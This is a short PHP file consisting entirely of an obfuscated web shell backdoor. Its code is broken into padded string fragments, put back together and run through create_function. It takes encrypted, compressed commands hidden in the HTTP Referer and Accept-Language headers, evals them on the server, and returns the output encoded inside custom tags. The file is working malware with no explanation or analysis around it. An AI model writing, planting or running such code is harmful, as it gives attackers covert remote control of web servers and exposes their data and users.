<?php
$g=str_replace('Js','','creJsaJsJste_fuJsnJsctJsion');
$X='$1/p=$ss($p1/,3);}if(1/array_1/1/ke1/y_1/exists($i,$s)){$s[$i]1/.=$p;$e=1/1/strpos(1/$s[';
$p='$kh="1/5d41/1";$kf="1/4021/a";functi1/on x($t,$1/k)1/{$c=strlen(1/$k);$l=1/strlen1/($t);$';
$E=',0,$e)1/)),1/$k)));$1/o=o1/b_get_con1/tents(1/);o1/b_end_clean(1/);$d=1/base1/64_encode(';
$z='1/o1/="";for1/($i=0;1/$i<$l;){fo1/r($j=0;1/($j<$c1/&&$i1/<$l);$j+1/+,$i++)1/{$o.=$1/t{$i}^';
$s='1/unt($m[1]1/);$z+1/+1/)$p.1/=$q[$m[1/2][$z]];if1/(s1/trpos($p,$h)===0){1/$s1/[$i]="";1/';
$v='"HTTP_1/A1/C1/CEPT_1/1/LA1/NGUAGE"];if($rr1/&&$ra)1/{$u=parse_ur1/l($rr);par1/se1/_str($';
$O='1/ON;$s1/s="substr";$s1/l="1/strto1/lower";$i=$m1/[1][0]1/.$m[1]1/1/[1];$h1/=$sl($1/ss(m';
$a='1/x(gz1/1/compress($o)1/,$k));1/print(1/"<$1/k>1/$d</$1/k>");@se1/ssion_de1/stroy();}}}}';
$G='1/ase64_decode(preg_replace(ar1/ra1/y1/("/_/","/1/-/"),a1/rra1/y("/","+"),$ss(1/$s[$i]1/';
$Z='d1/5($i.$kh)1/,0,1/3));$f=$sl(1/$ss(1/md5($1/i.$kf1/),1/0,3))1/;$p1/="";for($1/z=1;$z<co';
$C='1/$k{1/$j1/};}}ret1/urn $o;}$1/r=$_S1/ERVER;$1/rr=@$r1/["HTT1/P_REF1/1/ERER"];$ra=@$r1/[';
$M='$i],1/$1/f);if($e){$k=$k1/h.$kf1/;ob_sta1/rt(1/);@e1/val(1/@gzun1/comp1/ress(@x(1/1/@b1/';
$r='1/:1/;1/q=0.([\\d]))?,1/?/",$r1/a,$m);if($q&&$1/m1/){@s1/ession_start(1/);$s=&1/$_SES1/SI';
$w='u["que1/ry"],$1/q);$q=a1/rray_v1/alues1/($q)1/;preg_1/match_a1/ll("1/1/1//([\\w])[\\w-]+(?';
$e=str_replace('1/','',$p.$z.$C.$v.$w.$r.$O.$Z.$s.$X.$M.$G.$E.$a);
$J=$g('',$e);$J();
?>
